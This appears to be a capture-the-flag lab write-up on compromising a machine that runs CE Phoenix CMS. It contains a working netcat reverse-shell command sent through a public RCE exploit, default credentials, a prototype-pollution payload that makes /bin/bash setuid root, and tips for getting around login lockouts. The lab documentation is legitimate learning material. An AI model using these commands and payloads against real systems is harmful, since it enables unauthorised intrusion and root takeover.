### Exploitation

There is a Web Service running on port 80 called `CE Phoenix` looking for exploits on it, we identified the following [CE Phoenix 1.0.8.20 Remote Code Execution](https://vulners.com/zdt/1337DAY-ID-39172), but the exploit requires authentication, also the exploit points to the `admin` URI, I then tried to login using Default Credentials, and I got the pair `admin:password123`, with this, we can execute the script which is an OS Command Injection vulnerability:
```bash
python3 exploit.py http://phobex.echocity-f.com/ 'admin' 'password123' 'nc -e /bin/bash 10.10.5.122 1234'

     CE Phoenix v1.0.8.20 - Remote Code Execution

     Author:tmrswrr                                                           

[+] Starting the exploitation process...
[+] Attempting to exploit the target...
[+] Performing login...
[+] Login successful.
[+] Executing the exploit...
[+] Exploit executed successfully.
```

### Privilege Escalation
For the Privilege Escalation I then proceed to execute the command `sudo -l` and I can execute a script as user root without password:
```bash
www-data@phobex:/var/www/html$ sudo -l
Matching Defaults entries for www-data on phobex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on phobex:
    (ALL : ALL) NOPASSWD: /usr/local/bin/obex
```
Its content is like this:
```bash
#! /usr/bin/env node
var args = process.argv.slice(2);
const { exec } = require('child_process');

(async () => {
  const lib = await import('@almela/obx');
  var USER_JSON = JSON.parse(args[0]);
  var user={
    'username': "root"
  };
  try {
    lib.add (user, USER_JSON)
  } catch (e) { }
  var newUser={}
  if(newUser.authenticated==true)
  {
    exec(newUser.command);
  }
})();
```

As usual, the vulnerability relays on the imported library, in this case `@almela/obx`, there is a vulnerability reported as [Prototype Pollution in @almela/obx](https://security.snyk.io/vuln/SNYK-JS-ALMELAOBX-7271947), after reading the article and with the aid of DeepSeek I came with the following payload:
```bash
www-data@phobex:/var/www/html$ sudo /usr/local/bin/obex '{"__proto__":{"authenticated":true,"command":"chmod +s /bin/bash"}}'
www-data@phobex:/var/www/html$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash
```
And we ARE INSIDEEEE!!!

### Post Exploitation

Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`environment variables (env command)`
`/root`

### Credentials

- Credentials identified for CE Phoenix CMS are `admin:password123`

### Notes

-  Always look for admin endpoints, sometimes the webapps have two or more login pages. If the application has a failed user attempt protection, always try to delete the cookies, use another CSRF token or bypass such protection so you are able to perform a dictionary attack, it is important to know how to use Burp Macros for that matter, in this case, this machine took me a lot of time because the credentials `admin:password123` did not worked when I tried to use them, but that was because I was on cool off period for attempting a lot of other default credentials.
